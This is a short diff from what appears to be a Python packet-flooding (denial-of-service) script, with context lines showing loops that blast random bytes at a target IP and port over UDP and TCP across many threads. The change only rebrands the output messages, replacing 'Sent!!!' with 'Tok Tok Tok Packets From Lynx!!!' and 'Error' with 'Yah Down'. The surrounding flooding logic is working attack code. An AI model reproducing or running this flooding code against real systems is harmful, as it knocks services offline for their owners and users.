@@ -18,9 +18,9 @@ def run():
 			addr = (str(ip),int(port))
 			for x in range(times):
 				s.sendto(data,addr)
-			print(i +" Sent!!!")
+			print(i +" Tok Tok Tok Packets From Lynx!!!")
 		except:
-			print("[!] Error!!!")
+			print("[!] Yah Down!!!")
 
 def run2():
 	data = random._urandom(16)
@@ -32,10 +32,10 @@ def run2():
 			s.send(data)
 			for x in range(times):
 				s.send(data)
-			print(i +" Sent!!!")
+			print(i +" Tok Tok Tok Packets From Lynx!!!")
 		except:
 			s.close()
-			print("[*] Error")
+			print("[*] Yah Down")
 
 for y in range(threads):
 	if choice == 'y':
